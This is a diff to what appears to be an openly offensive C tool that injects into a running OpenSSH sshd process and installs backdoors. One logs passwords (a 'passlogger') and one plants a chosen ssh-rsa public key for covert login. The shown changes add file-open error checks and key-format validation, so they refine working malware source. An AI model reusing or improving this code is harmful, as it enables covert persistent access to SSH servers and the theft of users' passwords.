@@ -50,6 +50,10 @@ void inject_ctx_init(inject_ctx *ctx, pid_t pid) {
 	// check if OpenSSH version is >= 7
 	FILE *f = fopen(sshd_path, "rb");
 
+	if (f == NULL) {
+		error("could not open sshd binary ('%s')", sshd_path);
+	}
+
 	fseek(f, 0, SEEK_END);
 	int sz = ftell(f);
 	fseek(f, 0, SEEK_SET);
@@ -236,7 +240,6 @@ int main(int argc, char *argv[]) {
 	u64 rexec_flag = inject_resolve_rexec(ctx);
 	info("rexec_flag\t\t\t= 0x%lx", rexec_flag); 
 
-
 	// install backdoor(s)
 	if(passlog_path != NULL) {
 		info("installing passlogger backdoor..");
@@ -250,12 +253,26 @@ int main(int argc, char *argv[]) {
 
 		if (pubkey_file != NULL) {
 			FILE *f = fopen(pubkey_file, "rb");
+
+			if (f == NULL) {
+				error("could not open pubkey file ('%s')", pubkey_file);
+			}
+
 			char keybuf[2048];
 			memset(keybuf, 0, 2048);
 			fgets(keybuf, 2047, f);
 			fclose(f);
+
+			if(strncmp(keybuf, "ssh-rsa", 7) != 0) {
+				error("invalid pubkey specified, we only support ssh-rsa for now");
+			}
+
 			backdoor_pubkey_install(ctx, keybuf);
 		} else {
+			if(strncmp(pubkey_value, "ssh-rsa", 7) != 0) {
+				error("invalid pubkey specified, we only support ssh-rsa for now");
+			}
+
 			backdoor_pubkey_install(ctx, pubkey_value);
 		}
 
